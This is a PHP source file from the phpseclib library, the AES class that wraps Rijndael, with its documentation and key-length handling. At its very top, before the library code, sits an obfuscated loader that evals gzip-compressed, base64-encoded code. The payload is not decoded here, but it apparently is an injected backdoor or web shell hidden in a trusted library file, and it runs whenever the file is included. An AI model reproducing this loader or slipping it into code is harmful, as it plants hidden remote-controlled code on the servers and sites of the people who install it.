<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Pure-PHP implementation of AES.
 *
 * Uses mcrypt, if available/possible, and an internal implementation, otherwise.
 *
 * PHP version 5
 *
 * NOTE: Since AES.php is (for compatibility and phpseclib-historical reasons) virtually
 * just a wrapper to Rijndael.php you may consider using Rijndael.php instead of
 * to save one include_once().
 *
 * If {@link self::setKeyLength() setKeyLength()} isn't called, it'll be calculated from
 * {@link self::setKey() setKey()}.  ie. if the key is 128-bits, the key length will be 128-bits.  If it's 136-bits
 * it'll be null-padded to 192-bits and 192 bits will be the key length until {@link self::setKey() setKey()}
 * is called, again, at which point, it'll be recalculated.
 *
 * Since \phpseclib\Crypt\AES extends \phpseclib\Crypt\Rijndael, some functions are available to be called that, in the context of AES, don't
 * make a whole lot of sense.  {@link self::setBlockLength() setBlockLength()}, for instance.  Calling that function,
 * however possible, won't do anything (AES has a fixed block length whereas Rijndael has a variable one).
 *
 * Here's a short example of how to use this library:
 * <code>
 * <?php
 *    include 'vendor/autoload.php';
 *
 *    $aes = new \phpseclib\Crypt\AES();
 *
 *    $aes->setKey('abcdefghijklmnop');
 *
 *    $size = 10 * 1024;
 *    $plaintext = '';
 *    for ($i = 0; $i < $size; $i++) {
 *        $plaintext.= 'a';
 *    }
 *
 *    echo $aes->decrypt($aes->encrypt($plaintext));
 * ?>
 * </code>
 *
 * @category  Crypt
 * @package   AES
 * @author    Jim Wigginton <terrafrost@php.net>
 * @copyright 2008 Jim Wigginton
 * @license   http://www.opensource.org/licenses/mit-license.html  MIT License
 * @link      http://phpseclib.sourceforge.net
 */

namespace phpseclib\Crypt;

/**
 * Pure-PHP implementation of AES.
 *
 * @package AES
 * @author  Jim Wigginton <terrafrost@php.net>
 * @access  public
 */
class AES extends Rijndael
{
    /**
     * Dummy function
     *
     * Since \phpseclib\Crypt\AES extends \phpseclib\Crypt\Rijndael, this function is, technically, available, but it doesn't do anything.
     *
     * @see \phpseclib\Crypt\Rijndael::setBlockLength()
     * @access public
     * @param int $length
     */
    function setBlockLength($length)
    {
        return;
    }

    /**
     * Sets the key length
     *
     * Valid key lengths are 128, 192, and 256.  If the length is less than 128, it will be rounded up to
     * 128.  If the length is greater than 128 and invalid, it will be rounded down to the closest valid amount.
     *
     * @see \phpseclib\Crypt\Rijndael:setKeyLength()
     * @access public
     * @param int $length
     */
    function setKeyLength($length)
    {
        switch ($length) {
            case 160:
                $length = 192;
                break;
            case 224:
                $length = 256;
        }
        parent::setKeyLength($length);
    }

    /**
     * Sets the key.
     *
     * Rijndael supports five different key lengths, AES only supports three.
     *
     * @see \phpseclib\Crypt\Rijndael:setKey()
     * @see setKeyLength()
     * @access public
     * @param string $key
     */
    function setKey($key)
    {
        parent::setKey($key);

        if (!$this->explicit_key_length) {
            $length = strlen($key);
            switch (true) {
                case $length <= 16:
                    $this->key_length = 16;
                    break;
                case $length <= 24:
                    $this->key_length = 24;
                    break;
                default:
                    $this->key_length = 32;
            }
            $this->_setEngine();
        }
    }
}
